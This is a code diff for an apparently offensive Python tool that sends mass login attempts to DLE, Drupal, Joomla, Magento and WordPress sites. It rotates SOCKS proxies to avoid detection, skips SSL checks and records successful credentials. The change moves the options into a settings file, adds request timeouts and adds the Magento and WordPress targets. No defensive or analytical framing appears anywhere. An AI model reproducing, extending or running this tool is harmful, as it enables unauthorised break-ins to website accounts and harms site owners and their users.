@@ -2,19 +2,21 @@
 
 import asyncio
 import contextlib
+from json import loads
 from re import match
 from ssl import SSLError
 from urllib.parse import urlsplit
 
 from aiofiles import open as afile
-from aiohttp import ClientSession
+from aiohttp import ClientSession, ClientTimeout
 from aiohttp_socks import SocksConnectionError, SocksConnector, SocksError
-from async_timeout import timeout as ftime
 from bs4 import BeautifulSoup
 
 from dle import DLE
 from drupal import Drupal
 from joomla import Joomla
+from magento import Magento
+from wordpress import WordPress
 
 
 @contextlib.contextmanager
@@ -60,8 +62,8 @@ def macros(p, u, s):
 
 async def proxy_request():
     async with ClientSession() as s:
-        async with s.get(socks_url) as resp:
-            return await (resp.text()).split('\n')
+        async with s.get(settings['link']) as resp:
+            return (await resp.text()).split('\n')
 
 
 async def save(where, what):
@@ -71,28 +73,26 @@ async def save(where, what):
 
 
 async def first(s, url):
-    async with ftime(timeout):
-        async with s.get(url, ssl=False) as r:
-            return [await r.text(), r.status]
+    async with s.get(url, ssl=False) as r:
+        return [await r.text(), r.status]
 
 
 async def second(s, url, data):
-    async with ftime(timeout):
-        async with s.post(url, data=data, ssl=False) as r:
-            return [await r.text(), r.status]
+    async with s.post(url, data=data, ssl=False) as r:
+        return [await r.text(), r.status]
 
 
 async def process(link, user, passw, proxy):
     global finished, good
 
-    cproxy = SocksConnector.from_url(f'socks{socks_type}://' + proxy)
+    cproxy = SocksConnector.from_url(f'socks{settings["socks"]}://' + proxy)
 
     try:
         user = macros(user, link, '')
         passw = macros(passw, link, user)
 
         with silent_out():
-            async with ClientSession(connector=cproxy) as s:
+            async with ClientSession(connector=cproxy, timeout=timeout) as s:
                 data = await first(s, link)
 
                 if not module.valid(data[1], data[0]):
@@ -152,13 +152,13 @@ async def main():
                             curindx += 1
 
                             if curindx >= lenofpr:
-                                if update:
+                                if settings['update']:
                                     proxies = await proxy_request()
                                     lenofpr = len(proxies) - 10
 
                                 curindx = 0
 
-                            if len(tasks) >= threads:
+                            if len(tasks) >= settings['threads']:
                                 await asyncio.gather(*tasks)
                                 tasks = []
 
@@ -173,15 +173,13 @@ if __name__ == "__main__":
     modules = {
         '0': DLE(),
         '1': Drupal(),
-        '2': Joomla()
+        '2': Joomla(),
+        '3': Magento(),
+        '4': WordPress()
     }
 
-    threads = int(input('Threads: '))
-    timeout = int(input('Timeout: '))
-
-    socks_type = input('SOCKS Ver.: ')
-    socks_url = input(f'SOCKS{socks_type} Link: ')
-    update = bool(int(input('Update proxy: ')))
+    settings = loads(open('settings.json', 'r', encoding="utf-8").read())
+    timeout = ClientTimeout(total=settings['timeout'])
 
     module = modules[
         input(
@@ -189,6 +187,8 @@ if __name__ == "__main__":
             '0 - DLE\n' +
             '1 - Drupal\n' +
             '2 - Joomla\n' +
+            '3 - Magento\n' +
+            '4 - WordPress\n' +
             'Select: '
         )
     ]
